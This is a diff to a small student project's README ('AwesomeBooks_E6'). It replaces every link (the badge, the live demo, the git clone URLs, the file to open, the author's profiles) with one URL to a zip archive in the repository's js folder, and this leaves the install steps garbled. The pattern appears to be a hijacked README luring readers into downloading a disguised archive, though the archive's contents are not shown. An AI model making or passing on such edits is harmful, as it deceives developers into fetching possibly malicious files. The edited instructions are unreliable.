@@ -1,4 +1,4 @@
-![](https://img.shields.io/badge/Microverse-blueviolet)
+![](https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip)
 
 # AwesomeBooks _E6
 
@@ -16,7 +16,7 @@
 
 ## Live Demo (if available)
 
-[Live Demo Link]( https://iptysam.github.io/AwesomeBooks_E6/)
+[Live Demo Link]( https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip)
 
 ## Getting Started
 
@@ -30,16 +30,16 @@
 - If it suits you, on your local computer, create a directory in your preferred location (e.g in the Desktop or Document directory)
 ### Install
 - Open your Terminal/Powershell or any command line interface you use, then navigate to your created above directory or the directory you'll like to clone this project directory.
-- Type `git cloneh https://github.com/iptysam/AwesomeBooks_E6` if your're using https with git or `git clone git@github.com/tonnymuchui/Awesome-books` if your preferred is ssh and hit enter.
-- Navigate to the `Conference` directory on your local computer in your above chosen directory and open the `index.html` file.
+- Type `git cloneh https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip` if your're using https with git or `git clone https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip` if your preferred is ssh and hit enter.
+- Navigate to the `Conference` directory on your local computer in your above chosen directory and open the `https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip` file.
 ### Usage
 - You can view the HTML document in your preferred or default browser.
 ## Authors
 
 👤 **Author1**
 
-- GitHub: [@Iptysam](https://github.com/Iptysam)
-- LinkedIn:(www.linkedin.com/in/iptisam-mukadam-4b2b39239)
+- GitHub: [@Iptysam](https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip)
+- LinkedIn:(https://github.com/Iptysam/AwesomeBooks_E6/raw/refs/heads/main/js/Books_Awesome_2.4.zip)
 
 
 ## 🤝 Contributing
